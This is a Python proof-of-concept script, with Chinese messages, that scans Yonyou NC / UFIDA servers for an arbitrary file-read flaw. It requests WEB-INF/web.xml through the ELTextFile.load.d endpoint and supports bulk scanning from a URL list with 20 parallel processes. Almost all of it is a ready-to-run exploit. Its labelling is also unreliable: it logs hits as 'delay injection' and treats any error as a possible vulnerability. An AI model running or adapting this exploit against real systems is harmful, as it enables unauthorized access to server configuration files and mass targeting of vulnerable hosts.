import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """

   __  ______  ____  ____ ___  ______  __  __
  / / / / __ \/ __ \/ __ `/ / / / __ \/ / / /
 / /_/ / /_/ / / / / /_/ / /_/ / /_/ / /_/ / 
 \__, /\____/_/ /_/\__, /\__, /\____/\__,_/  
/____/            /____//____/               

"""
    print(test)


def poc(target):
    payload = "/hrss/ELTextFile.load.d?src=WEB-INF/web.xml"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    try:
        res1 = requests.get(url=target, verify=False, headers=headers, timeout=15)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload, verify=False, headers=headers, timeout=15)
            if 'web-app' in res2.text:
                print(f"该{target}存在任意文件读取漏洞")
                with open("用友_result.txt", "a", encoding="utf-8") as f:
                    f.write(f"[+]{target}存在延时注入漏洞\n")

            else:
                print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")


def main():
    banner()
    parser = argparse.ArgumentParser(description="用友NC UFIDA ELTextFile.load.d任意文件读取漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()